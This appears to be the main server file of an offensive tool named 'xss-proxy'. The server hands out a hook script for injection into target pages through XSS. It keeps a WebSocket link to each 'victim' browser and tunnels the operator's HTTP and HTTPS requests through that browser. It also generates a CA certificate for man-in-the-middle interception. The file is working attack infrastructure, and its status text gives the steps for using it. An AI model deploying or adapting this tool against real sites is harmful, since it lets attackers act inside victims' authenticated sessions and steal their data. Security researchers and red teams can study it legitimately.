import http from "node:http";
import https from "node:https";
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { WebSocketServer } from "ws";
import { generateCA } from "./certs.js";
import { handleHttpProxy, handleConnect } from "./proxy.js";

const args = process.argv.slice(2);

function getArg(name, fallback) {
  const idx = args.indexOf(name);
  return idx !== -1 && args[idx + 1] ? args[idx + 1] : fallback;
}

const protocol = args.includes("--https") ? "https" : "http";
const port = parseInt(getArg("--port", "8080"), 10);
const certFile = getArg("--cert", undefined);
const keyFile = getArg("--key", undefined);
const requestTimeout = parseInt(getArg("--timeout", "30000"), 10);

const hookScript = fs.readFileSync(
  path.join(import.meta.dirname, "public", "hook.js"),
);

// Generate CA for HTTPS MITM
const ca = generateCA();
const caPath = path.join(import.meta.dirname, "ca.crt");
fs.writeFileSync(caPath, ca.cert);

// Victim connection state
let victimWs = null;
const pending = new Map();

function forwardRequest(request, callback) {
  if (!victimWs || victimWs.readyState !== 1) {
    callback({ error: "No victim browser connected" });
    return;
  }

  const id = crypto.randomUUID();
  pending.set(id, callback);

  victimWs.send(JSON.stringify({ type: "request", id, ...request }));

  setTimeout(() => {
    if (pending.has(id)) {
      pending.delete(id);
      callback({ error: "Request timed out" });
    }
  }, requestTimeout);
}

function onRequest(req, res) {
  if (req.url === "/hook.js") {
    res.writeHead(200, {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*",
      "Cache-Control": "no-store",
    });
    res.end(hookScript);
    return;
  }

  if (req.url === "/status") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ victim: victimWs !== null }));
    return;
  }

  // Proxy: absolute URL means it's a proxy request
  if (req.url.startsWith("http://") || req.url.startsWith("https://")) {
    handleHttpProxy(req, res, forwardRequest);
    return;
  }

  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end(
    [
      "xss-proxy is running.",
      "",
      `Hook URL:   ${protocol}://localhost:${port}/hook.js`,
      `Proxy:      ${protocol}://localhost:${port}`,
      `Victim:     ${victimWs ? "connected" : "waiting..."}`,
      "",
      "Inject the hook script into a target page via XSS,",
      "then configure your HTTP client to use this server as a proxy.",
      "",
    ].join("\n"),
  );
}

// Create server
let server;
if (protocol === "https") {
  if (!certFile || !keyFile) {
    console.error("HTTPS mode requires --cert and --key arguments.");
    console.error(
      "Usage: node server.js --https --cert server.crt --key server.key",
    );
    process.exit(1);
  }
  server = https.createServer(
    {
      cert: fs.readFileSync(certFile),
      key: fs.readFileSync(keyFile),
    },
    onRequest,
  );
} else {
  server = http.createServer(onRequest);
}

// CONNECT handler for HTTPS targets
server.on("connect", (req, socket, head) => {
  handleConnect(req, socket, head, forwardRequest);
});

// WebSocket for victim browsers
const wss = new WebSocketServer({ server, path: "/ws" });

wss.on("connection", (ws) => {
  victimWs = ws;
  console.log("[+] Victim browser connected");

  ws.on("message", (data) => {
    let msg;
    try {
      msg = JSON.parse(data);
    } catch {
      return;
    }

    if (msg.type !== "response") return;

    const cb = pending.get(msg.id);
    if (!cb) return;
    pending.delete(msg.id);

    if (msg.error) {
      cb({ error: msg.error });
    } else {
      cb(msg.response);
    }
  });

  ws.on("close", () => {
    console.log("[-] Victim browser disconnected");
    if (victimWs === ws) victimWs = null;
  });
});

server.listen(port, () => {
  console.log(`xss-proxy listening on ${protocol}://localhost:${port}`);
  console.log(`Hook:  ${protocol}://localhost:${port}/hook.js`);
  console.log(`CA:    ${caPath} (import into browser for HTTPS MITM)`);
  console.log("Waiting for victim connection...");
});
